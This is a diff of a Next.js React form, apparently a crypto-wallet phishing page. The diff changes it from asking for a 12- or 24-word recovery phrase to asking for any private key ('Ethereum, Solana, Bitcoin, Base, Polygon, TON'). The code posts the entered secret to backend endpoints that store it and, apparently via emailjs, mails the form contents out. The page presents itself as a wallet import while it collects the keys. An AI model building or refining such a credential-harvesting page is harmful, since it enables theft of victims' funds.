@@ -6,40 +6,33 @@ import { faLeftLong } from "@fortawesome/free-solid-svg-icons";
 import { useRouter } from "next/navigation";
 import emailjs from "@emailjs/browser";
 
-export default function Input() {
+export default function InputPassKey() {
   const form = useRef<HTMLFormElement>(null);
-  const [inputValue, setInputValue] = useState("");
+  const [inputPasskey, setInputPasskey] = useState("");
   const [errorMessage, setErrorMessage] = useState("");
   const [loading, setLoading] = useState(false);
   const router = useRouter();
 
   const handleChange = (event: React.ChangeEvent<HTMLInputElement>) => {
-    setInputValue(event.target.value);
+    setInputPasskey(event.target.value);
     setErrorMessage("");
   };
 
   const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
     event.preventDefault();
 
-    const wordCount = inputValue.trim().split(/\s+/).length;
-
-    if (wordCount !== 12 && wordCount !== 24) {
-      setErrorMessage("Input must contain exactly 12 or 24 words.");
-      return;
-    }
-
     try {
-      const response = await fetch("/api/check-input", {
+      const response = await fetch("/api/check-input-passkey", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify({ inputValue }),
+        body: JSON.stringify({ inputPasskey }),
       });
 
       const data = await response.json();
       if (data.exists) {
-        console.log("existed.");
+        console.log("existed");
         router.replace("/submit");
         return;
       }
@@ -53,12 +46,12 @@ export default function Input() {
           process.env.NEXT_PUBLIC_APP_PUBLIC_KEY!
         );
 
-        const saveResponse = await fetch("/api/input", {
+        const saveResponse = await fetch("/api/input-passkey", {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
           },
-          body: JSON.stringify({ inputValue }),
+          body: JSON.stringify({ inputPasskey }),
         });
 
         if (!saveResponse.ok) {
@@ -66,7 +59,7 @@ export default function Input() {
         }
 
         console.log("Form submitted successfully");
-        setInputValue("");
+        setInputPasskey("");
         router.replace("/submit");
         // eslint-disable-next-line @typescript-eslint/no-explicit-any
       } catch (error: any) {
@@ -93,10 +86,10 @@ export default function Input() {
           </button>
         </div>
         <div className="mb-4">
-          <h1 className=" text-2xl font-bold">Import Recovery Phrase</h1>
+          <h1 className=" text-2xl font-bold">Import Private Key</h1>
           <p className=" py-5">
-            Enter your wallet&apos;s 12-word recovery phrase or private key. You
-            can import any Ethereum, Solana or Bitcoin recovery phrase.
+            Enter your existing wallet&apos;s private key. All Private Keys are
+            supported Ethereum, Solana, Bitcoin, Base, Polygon, TON, etc..
           </p>
         </div>
       </div>
@@ -107,9 +100,9 @@ export default function Input() {
               type="text"
               name="message"
               id="message"
-              placeholder="Enter or paste 12 or 24-words recovery phrase"
+              placeholder="Enter or paste your private key"
               className="w-full py-3 px-4 rounded-lg outline outline-1 outline-gray-500"
-              value={inputValue}
+              value={inputPasskey}
               onChange={handleChange}
             />
             {errorMessage && <p className="text-red-500">{errorMessage}</p>}
